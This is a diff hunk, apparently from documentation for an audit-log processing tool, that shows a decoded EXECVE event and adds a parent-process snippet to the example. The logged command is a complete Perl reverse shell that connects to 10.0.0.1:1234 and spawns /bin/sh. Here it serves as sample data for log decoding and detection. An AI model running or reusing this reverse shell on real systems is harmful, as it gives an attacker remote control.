@@ -12,7 +12,10 @@ type=EXECVE msg=audit(1626611363.720:348501): argc=3 a0="perl" a1="-e" a2=757365
 ```
 { … "EXECVE":{ "argc": 3,"ARGV": ["perl", "-e", "use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};"]}, …}
 ```
-At the source.
+This happens at the source. The generated event even contains useful information about the spawning process:
+```
+"PARENT_INFO":{"ARGV":["bash"],"launch_time":1626611323.973,"ppid":3190631}
+```
 
 ## Description
 
